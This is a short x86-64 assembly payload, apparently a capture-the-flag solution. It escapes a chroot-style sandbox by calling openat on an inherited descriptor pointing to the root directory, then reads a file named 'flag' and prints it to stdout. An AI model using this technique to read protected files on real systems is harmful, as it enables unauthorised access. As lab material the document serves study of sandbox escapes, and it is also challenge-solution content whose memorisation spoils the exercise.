.global _start
.intel_syntax noprefix

_start:
    # Open the flag file using openat with fd 3 (already opened to /)
    mov rdi, 3                   # dirfd (3 points to /)
    lea rsi, [rip + flag_path]   # pathname (relative to the directory referred by fd 3)
    xor rdx, rdx                 # flags (O_RDONLY)
    mov rax, 257                 # openat syscall number
    syscall

    # Check if openat was successful
    test rax, rax
    js exit                      # jump to exit if openat failed

    # Save file descriptor
    mov r13, rax

    # Read the flag file
    mov rdi, r13                 # file descriptor
    lea rsi, [rip + buffer]      # buffer
    mov rdx, 100                 # number of bytes to read
    mov rax, 0                   # read syscall number
    syscall

    # Write to stdout
    mov rdi, 1                   # stdout file descriptor
    lea rsi, [rip + buffer]      # buffer
    mov rax, 1                   # write syscall number
    syscall

exit:
    # Exit
    xor rdi, rdi                 # exit code 0
    mov rax, 60                  # exit syscall number
    syscall

flag_path:
    .string "flag"
buffer:
    .skip 100                    # allocate 100 bytes for the buffer
